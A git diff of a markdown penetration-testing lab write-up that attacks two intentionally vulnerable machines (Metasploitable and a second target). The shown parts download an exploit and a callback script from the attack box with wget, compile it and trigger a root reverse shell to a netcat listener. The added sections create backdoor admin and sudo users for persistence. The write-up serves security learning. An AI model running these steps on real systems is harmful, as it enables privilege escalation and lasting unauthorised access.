@@ -10,11 +10,11 @@
 
 #### I. Introduction
 
-​	This scenario will demonstrate an attack against two target machines.  The machines are installed per the source instructions in default configurations.  Due to the nature of the process, the root username and passwords are known ahead of time, but will not be used unless they can be extracted from the machines themselves.
+​	This scenario will demonstrate an attack against two target machines.  The machines are installed according to the source instructions and are setup in default configurations.  Due to the nature of the installation process, the root username and passwords are known ahead of time, but will not be used unless they can be ostensibly extracted from the machines themselves.
 
 ​	The target IP addresses were obtained by an Nmap host scan.
 
-​	The attack box has the latest release of Kali Linux, and has had Nessus, armitage, and a few other extra utilities installed. 
+​	Kali Linux 2 is installed on the attacking machine, and has been updated to the latest release of the operating system and tools.
 
 
 
@@ -34,7 +34,7 @@
 
 #### II. Target 1: Metasploitable
 
-​	This machine is an imported Virtual Machine imported  into ESXi of [Metasploitable](https://information.rapid7.com/download-metasploitable-2017.html).  Metasploitable is an intentionally vulnerable Linux machine designed for Penetration Testing.  The goal for this target will be to explore some of the more interesting vulnerabilities included in these distributions (because there are some very quick and easy attack vectors available throughout this project).
+​	This is a virtual machine imported into a vSphere infrastructure of [Metasploitable](https://information.rapid7.com/download-metasploitable-2017.html).  Metasploitable is an intentionally vulnerable Linux machine designed for Penetration Testing.  The goal for this target will be to explore some of the more interesting vulnerabilities included in this distribution (specifically because there are some very quick and easy attack vectors available throughout this project).
 
  
 
@@ -42,9 +42,7 @@
 
 ##### 192.168.1.209
 
-To begin, we start with a basic script scan using Nmap.  The output file containing the results can be found [here](https://github.com/jjay1288/netattacksproj/blob/main/target/scans/nmapinitial).  Nmap is a network scanning tool used to enumerate networks.  It has the capability 
-
-
+​	To begin, we start with a basic script scan using Nmap.  Nmap is a network scanning tool used to enumerate networks.  It has the capability to identify hosts, open ports, and running services on the network on which it was run. The output file containing the results can be found [here](https://github.com/jjay1288/netattacksproj/blob/main/target/scans/nmapinitial). 
 
 | Port      | State | Service     | Version                             |
 | --------- | ----- | ----------- | ----------------------------------- |
@@ -91,7 +89,7 @@ To begin, we start with a basic script scan using Nmap.  The output file contain
 
 ![login](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/shell.PNG)
 
-​	We now have a basic shell under the user "daemon".  Next we will stabilize our shell (make it a full fledged TTY interface).  With a guess that python was installed, I stabilized with a one-liner of code
+​	We now have a basic shell under the user "daemon".  Next we will stabilize our shell (make it a full fledged TTY interface).  With a guess that python was installed, I stabilized with a one-liner of python code
 
 ```python
 python -c ‘import pty; pty.spawn(“/bin/sh”)’
@@ -103,7 +101,7 @@ python -c ‘import pty; pty.spawn(“/bin/sh”)’
 
 ##### C) Obtaining root access
 
-​	We will switch back to the console driven msfconsole, and redo our attack to get a better terminal experience.  By executing the following lines on our terminal, we can find some valuable information about the system.
+​	We will switch back to the console driven msfconsole, and rerun our exploit to obtain a better terminal experience.  By executing the following lines on our terminal, we can find some valuable information about the system.
 
 ```bash
 uname -a
@@ -128,15 +126,15 @@ wget http://192.168.1.210:8080/run
 wget http://192.168.1.210:8080/8572.c
 ```
 
-​	Then we compile the C code on that target machine into exploit.
+​	Then we compile the C code on the target machine into an executable file.
 
 ```bash
 gcc -o exploit 8572.c
 ```
 
-​	Now we have our payload compiled and ready to run on our target system.  When we execute it, it will run the code in the "run" file, which instructs the system to call back to our attack box with a bash shell (/bin/bash) that is started with root permissions, providing root access and full control of the system.
+​	Now we have our payload compiled and ready to run on our target system.  When we execute it, it will execute the code in the "run" file, which instructs the system to call back to our attack box with a reverse bash shell (/bin/bash) that possesses root permissions.
 
-​	First there are a few more steps.  The documentation indicated that we need to provide the exploit with the PID of the udevd netlink socket.  We can find it easily with
+​	Before this happens, there are a few more steps.  The documentation indicated that we need to provide the exploit with the PID of the udevd netlink socket.  We can find it easily with
 
 ```bash
 cat /proc/net/netlink
@@ -144,13 +142,13 @@ cat /proc/net/netlink
 
 ![enumsetup](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/pid.PNG)
 
-​	The only non-zero process ID is what we are looking for.  Then we start a netcat listenener on another terminal with:
+​	We are looking for a process with a PID of something other than 0. Next we start a netcat listener on another terminal with:
 
 ```bash
 nc -lvp 12345
 ```
 
-Now we are ready.  We pass the PID into the exploit and run it with:
+We pass the PID into the exploit and run it with:
 
 ```bash
 ./exploit 2761
@@ -158,7 +156,7 @@ Now we are ready.  We pass the PID into the exploit and run it with:
 
 ![enumsetup](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/reverseroot.PNG)
 
-​	Success!  Now we stabilize it once more.
+​	Success!  Now we stabilize our shell once more.
 
 ![enumsetup](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/stabileroot.PNG)
 
@@ -170,13 +168,26 @@ Success!  We have admin credentials!
 
 #### msfadmin:msfadmin
 
-​	Now we can simply ssh into the system and see what else we can explore.
+​	Now we can SSH into the system with full root privelidges.
 
 ![enumsetup](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/ssh.PNG)
 
-##### D) Conclusion
 
-​	This machine was understandably riddled with attack vectors.  Some of the key takeaways are the importance of updating software and services on important systems.  Most of the exploits found on this server are due specifically to outdated and unpatched software.  This specific system is probably too far gone however.  The distribution is way out of date, and the ability to connect to ubuntu repositories has been intentionally disabled.
+
+##### D. Creating a root user
+
+​	We will now create a new sudo user, with our own credentials.  Using visudo, we see that sudo users in this system are members of the "admin", and does not have a "sudo" or "root" group created.  We add a user and then add it to the correct group.
+
+```bash
+sudo adduser jjay1288
+sudo usermod -aG admin jjay1288
+```
+
+![enumsetup](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/adminuser.PNG)
+
+##### E) Conclusion
+
+​	This machine was understandably riddled with attack vectors.  Many of the attack vectors found on this server are due specifically to outdated and unpatched software.  The distribution is way out of date, and the ability to connect to ubuntu repositories has been intentionally disabled.
 
 
 
@@ -349,7 +360,18 @@ Then we copy the command (with a small edit for my specific version of php) at t
 
 ​	Now we can dump the password hashes, and have full control of the machine.  For good measure, we run the [LinEnum](https://github.com/rebootuser/LinEnum) script and dump the contents [here](https://github.com/jjay1288/netattacksproj/blob/main/target2/enum/linenum).
 
-##### E. Conclusion
+##### E. Creating a root user
+
+​	Finally, as with the previous target, we will create a root user on the system.  This will be done similarly to before, except we will add our user to the sudo group. 
+
+```bash
+sudo adduser jjay1288
+sudo usermod -aG sudo jjay1288
+```
+
+![msf](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/rootcred.PNG)
+
+##### F. Conclusion
 
 ​	One point that stood out prominently to me is the fact that a secure password is very important, even with other somewhat strong security measures.  The initial login page was not using the best security policies in the world; it could have locked me out after the initial work with burp suite.  However, because the root password was the same string as the username, and reasonable attacker would have access in a negligible amount of time.
 
